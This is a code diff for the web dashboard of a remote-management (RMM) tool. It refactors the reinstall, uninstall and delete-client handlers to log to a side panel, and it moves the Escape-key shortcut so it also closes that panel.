+        async function panelReinstall(clientId) {
             if (!confirm('🔄 Reinstall the RMM agent on this client?')) return;
-            addLog(`Reinstalling RMM agent on ${clientId}...`, 'info');
+            addPanelLog('🔄 Reinstalling RMM agent...', 'warning');
 
             try {
-                // First uninstall
                 await fetch(`/api/rmm/uninstall/${clientId}`, { method: 'POST' });
-                // Then deploy again
                 const res = await fetch(`/api/rmm/command/${clientId}`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
@@ -1587,22 +1902,22 @@
                 });
                 const data = await res.json();
                 if (data.status === 'ok') {
-                    addLog(`✅ Reinstall command sent to ${clientId}`, 'success');
-                    showToast('✅ Reinstall command sent', 'success');
+                    addPanelLog('✅ Reinstall command sent', 'success');
+                    showToast('✅ Reinstall sent', 'success');
                     setTimeout(() => fetchRmmClients(), 3000);
                 } else {
-                    addLog(`❌ Reinstall failed: ${data.message}`, 'error');
+                    addPanelLog(`❌ Failed: ${data.message}`, 'error');
                     showToast(`❌ Failed: ${data.message}`, 'error');
                 }
             } catch (e) {
-                addLog(`❌ Error reinstalling: ${e.message}`, 'error');
+                addPanelLog(`❌ Error: ${e.message}`, 'error');
                 showToast('❌ Error reinstalling', 'error');
             }
         }
 
-        async function uninstallAgent(clientId) {
+        async function panelUninstall(clientId) {
             if (!confirm('⚠️ This will uninstall the RMM agent. Are you sure?')) return;
-            addLog(`Uninstalling RMM agent from ${clientId}...`, 'warning');
+            addPanelLog('🗑️ Uninstalling RMM agent...', 'warning');
 
             try {
                 const res = await fetch(`/api/rmm/uninstall/${clientId}`, {
@@ -1611,20 +1926,23 @@
                 });
                 const data = await res.json();
                 if (data.status === 'ok') {
-                    addLog(`✅ RMM agent uninstalled from ${clientId}`, 'success');
-                    showToast(`✅ Uninstall command sent`, 'success');
-                    setTimeout(() => fetchRmmClients(), 3000);
+                    addPanelLog('✅ RMM agent uninstalled', 'success');
+                    showToast('✅ Uninstall sent', 'success');
+                    setTimeout(() => {
+                        fetchRmmClients();
+                        closePanel();
+                    }, 3000);
                 } else {
-                    addLog(`❌ Uninstall failed: ${data.message}`, 'error');
+                    addPanelLog(`❌ Failed: ${data.message}`, 'error');
                     showToast(`❌ Failed: ${data.message}`, 'error');
                 }
             } catch (e) {
-                addLog(`❌ Error uninstalling: ${e.message}`, 'error');
-                showToast('❌ Error sending uninstall command', 'error');
+                addPanelLog(`❌ Error: ${e.message}`, 'error');
+                showToast('❌ Error uninstalling', 'error');
             }
         }
 
-        async function deleteClient(clientId) {
+        async function panelDelete(clientId) {
             if (!confirm('Delete this client from the dashboard?')) return;
 
             try {
@@ -1633,9 +1951,10 @@
                 });
                 const data = await res.json();
                 if (data.status === 'ok') {
-                    addLog(`🗑️ Client ${clientId} deleted from dashboard`, 'info');
-                    showToast(`✅ Client deleted`, 'success');
+                    addPanelLog('🗑️ Client deleted from dashboard', 'info');
+                    showToast('✅ Client deleted', 'success');
                     fetchRmmClients();
+                    closePanel();
                 } else {
                     showToast(`❌ Failed: ${data.message}`, 'error');
                 }
@@ -1779,6 +2098,19 @@
         }
 
         // ============================================================
+        // KEYBOARD SHORTCUTS
+        // ============================================================
+
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'Escape') {
+                closePanel();
+                closeSettings();
+                hideLogoutConfirm();
+                hideCustomConfirm();
+            }
+        });
+
+        // ============================================================
         // INIT
         // ============================================================
 
@@ -1789,14 +2121,6 @@
                 updatePayloadUrls();
                 setInterval(fetchRmmClients, 30000);
             });
-        });
-
-        document.addEventListener('keydown', function(e) {
-            if (e.key === 'Escape') {
-                closeSettings();
-                hideLogoutConfirm();
-                hideCustomConfirm();
-            }
         });
 
         console.clear();
